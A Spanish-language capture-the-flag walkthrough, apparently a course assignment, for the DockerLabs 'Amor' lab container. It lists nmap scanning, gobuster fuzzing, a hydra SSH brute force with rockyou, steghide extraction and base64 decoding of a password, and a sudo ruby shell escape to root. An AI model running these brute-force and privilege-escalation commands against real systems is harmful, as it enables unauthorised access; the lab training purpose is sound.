# Reto Amor - DockerLabs ✨

**My. Uribe Vergara Carlos Augusto**

---

## Introducción
DockerLabs es una plataforma que ofrece una serie de desafíos prácticos relacionados con Docker, organizados por niveles de dificultad. En esta oportunidad, se abordará el reto "Amor" clasificado como **Fácil**, utilizando herramientas esenciales en ciberseguridad ofensiva como `nmap`, `hydra`, `gobuster`, `steghide`, entre otras.

---

## **Taller Individual**

**1.** Realizar una investigación individual de cada una de las herramientas empleadas. Sintetice el resultado mediante un cuadro que explique su definición, funcionalidad y casos de uso.

**2.** Explicar en detalle cada uno de los comandos empleados realizando un desglose del mismo y citando al menos tres alternativas (si aplica) de variantes del comando.

**3.** Realice un diagrama de flujo de todo el procedimiento realizado.

---
## Requisitos Previos
- Sistema Kali Linux (actualizado).
- Docker instalado.
- Conectividad en red con la máquina host y la DockerLab.
- Wordlists comunes (`rockyou.txt`, `directory-list-2.3-medium.txt`).

---

## Despliegue del laboratorio

### Paso 1: Transferencia de archivos desde la host
```bash
scp -r amor kali@192.168.1.12:/home/kali/Documents/
```

### Paso 2: Instalación de Docker (si no está instalado)
```bash
sudo apt install docker.io
```

### Paso 3: Ejecución del script de despliegue
```bash
cd Documents/amor
chmod +x auto_deploy.sh
./auto_deploy.sh amor.tar
```

---

## Escaneo y reconocimiento

### Paso 4: Ver interfaz de red
```bash
ip add
```

### Paso 5: Descubrimiento de hosts
```bash
sudo netdiscover -i docker0 -r 172.17.0.0/24
```

### Paso 6: Escaneo de puertos y servicios
```bash
sudo nmap --min-rate 5000 -p- -sS -sV 172.17.0.2
```

---

## Fuzzing Web
```bash
gobuster dir -u http://172.17.0.2/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

---

## Fuerza bruta SSH con Hydra
```bash
hydra -l carlota -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2 -t 10
```

---

## Acceso a SSH y exploración
```bash
ssh carlota@172.17.0.2
cd /carlota/Desktop/fotos/vacaciones
```

### Transferencia de la imagen a Kali
```bash
scp carlota@172.17.0.2:/home/carlota/Desktop/fotos/vacaciones/imagen.jpg /home/kali/Documents/amor
```

---

## Análisis de archivo e ingeniería inversa

### Tipo de archivo
```bash
file imagen.jpg
```

### Extracción con esteganografía
```bash
steghide --extract -sf imagen.jpg
```

### Decodificación de base64
```bash
echo "ZXNsYWNhc2FkZXBpbnlwb24=" | base64 -d; echo
```

### Escalada de privilegios
```bash
su oscar
sudo -l
sudo /usr/bin/ruby -e 'exec "/bin/bash"'
whoami
```

---

## Cuadro de herramientas utilizadas
| Herramienta     | Definición                                                                 | Funcionalidad principal                                                     | Casos de uso comunes                                      |
|-----------------|----------------------------------------------------------------------------|------------------------------------------------------------------------------|------------------------------------------------------------|
| `nmap`          | Network Mapper, escáner de red.                                           | Descubrir hosts, puertos abiertos y servicios en red.                       | Pentesting, auditorías de red, reconocimiento.           |
| `hydra`         | Herramienta de fuerza bruta de logins.                                     | Realizar ataques por diccionario a servicios como SSH, FTP, HTTP, etc.     | Test de credenciales, CTF, auditorías de acceso.          |
| `gobuster`      | Buscador de directorios y archivos ocultos en aplicaciones web.            | Enumerar directorios, recursos y endpoints ocultos.                         | Fuzzing web, test de exposición.                         |
| `steghide`      | Herramienta para ocultar y extraer archivos dentro de imágenes o audio.   | Esteganografía: ocultar/extraer información.                                | CTF, análisis forense, canales encubiertos.               |
| `scp`           | Secure Copy Protocol.                                                      | Transferencia de archivos remota por SSH.                                    | Carga/descarga de recursos, backup seguro.                |
| `docker.io`     | Plataforma de contenedores para despliegue y prueba de servicios.          | Ejecutar entornos aislados reproducibles.                                    | DevOps, laboratorios, pruebas de seguridad.               |
| `base64`        | Codificador/decodificador base64.                                          | Transformar texto para transmisiones o almacenamiento.                      | Decodificación de mensajes, CTF, criptografía básica.     |
| `sudo`/`ruby`   | Escalada de privilegios / ejecución de scripts con permisos.               | Ejecutar comandos como root / crear shell interactivo.                      | Post-explotación, privilege escalation.                   |

---

## Variantes de Comandos Empleados

### `nmap`
- `-sC`: Usa scripts por defecto.
- `-A`: Detección completa (OS, traceroute, versiones).
- `-Pn`: Desactiva ping previo (para firewalls).

### `hydra`
- `-L`: Archivo de usuarios.
- `-e ns`: Prueba con contraseñas vacías o iguales al usuario.
- `-vV`: Modo verboso con muestra de intentos.

### `gobuster`
- `-x php,html`: Busca extensiones específicas.
- `-t 50`: Threads (hilos) para acelerar.
- `-o resultado.txt`: Guarda la salida.

### `steghide`
- `--info`: Muestra información sobre el archivo.
- `--embed`: Inserta archivo.
- `--pass "clave"`: Define contraseña.

### `scp`
- `-P 2222`: Especifica puerto personalizado.
- `-v`: Verbose (muestra proceso).
- `-i clave.pem`: Usa una clave privada para conectarse.

---

## Diagrama de flujo del procedimiento

imagen

---

## Conclusión
Este ejercicio práctico permite aplicar técnicas de reconocimiento, explotación y escalada de privilegios dentro de un entorno aislado usando Docker. Es ideal para fortalecer las competencias de pentesting, esteganografía y gestión de herramientas de ciberseguridad en un escenario realista.

---

## Fuentes
- [https://dockerlabs.es](https://dockerlabs.es)
- [https://nmap.org](https://nmap.org)
- [https://github.com/OJ/gobuster](https://github.com/OJ/gobuster)
- [https://tools.kali.org/password-attacks/hydra](https://tools.kali.org/password-attacks/hydra)
- [https://linux.die.net/man/1/steghide](https://linux.die.net/man/1/steghide)
- [https://github.com](https://github.com)
